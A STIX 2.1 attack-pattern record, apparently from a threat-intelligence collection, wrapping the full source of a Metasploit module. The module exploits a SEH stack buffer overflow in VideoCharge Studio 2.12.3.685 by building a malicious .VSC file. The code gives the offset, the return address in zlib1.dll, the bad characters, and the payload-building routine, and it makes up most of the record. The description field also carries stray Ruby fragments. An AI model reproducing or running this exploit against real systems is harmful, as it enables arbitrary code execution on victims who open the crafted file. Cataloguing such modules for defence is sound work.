{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--781e16ce-3d41-4a3d-b200-ea6e08ec702b",
    "created": "2024-08-14T16:36:49.216149Z",
    "modified": "2024-08-14T16:36:49.216153Z",
    "name": "VideoCharge Studio Buffer Overflow (SEH)",
    "description": " This module exploits a stack based buffer overflow in VideoCharge Studio 2.12.3.685 when processing a specially crafted .VSC file. This vulnerability could be exploited by a remote attacker to execute arbitrary code on the target machine by enticing a user of VideoCharge Studio to open a malicious .VSC file.  'License'    => MSF_LICENSE 'Notes' => { 'Stability' => [] 'SideEffects' => [] 'Reliability' => []",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/videocharge_studio.rb",
            "external_id": "videocharge_studio.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'    => 'VideoCharge Studio Buffer Overflow (SEH)',\n      'Description'  => %q{\n          This module exploits a stack based buffer overflow in VideoCharge Studio 2.12.3.685 when\n          processing a specially crafted .VSC file. This vulnerability could be\n          exploited by a remote attacker to execute arbitrary code on the target\n          machine by enticing a user of VideoCharge Studio to open a malicious .VSC file.\n      },\n      'License'    => MSF_LICENSE,\n      'Notes' => {\n        'Stability' => [],\n        'SideEffects' => [],\n        'Reliability' => [],\n        'NOCVE' => ['Reason not given']\n      },\n      'Author'    =>\n        [\n          'metacom',            # Original discovery\n          'Andrew Smith',       # MSF module\n          'Christian Mehlmauer' # MSF module\n        ],\n      'References'  =>\n        [\n          [ 'OSVDB', '69616' ],\n          [ 'EDB', '29234' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process'\n        },\n      'Platform'  => 'win',\n      'Payload'   =>\n        {\n          'BadChars'    => \"\\x00\\x0a\\x0d\\x3c\\x22\\x26\",\n          'DisableNops' => true,\n          'Space'       => 2808\n        },\n      'Targets'   =>\n        [\n          [ 'VideoCharge Studio 2.12.3.685',\n            {\n              'Ret'     =>  0x61B811F1, #p/p/r | zlib1.dll\n              'Offset'  =>  2184\n            }\n          ],\n        ],\n      'Privileged'  => false,\n      'DisclosureDate'  => '2013-10-27',\n      'DefaultTarget'  => 0))\n\n    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.vsc']),])\n\n  end\n\n  def exploit\n\n    buffer  = rand_text_alpha(target['Offset'])\n    buffer << generate_seh_record(target.ret)\n    buffer << payload.encoded\n\n    file = %Q|<?xml version=\"1.0\" encoding=\"Windows-1252\" ?><config ver=\"2.12.3.685\">\n<cols name=\"Files\"/>\n<cols name=\"Profiles\">\n<Property name=\"Profile\">\n<cols name=\"Formats\">\n<Property name=\"Stream\">\n<Value name=\"Name\" type=\"8\" value=\"#{buffer}\"/>\n</Property>\n</cols>\n</Property>\n</cols>\n</config>|\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(file)\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2013-10-27",
    "x_mitre_platforms": [
        "win'"
    ]
}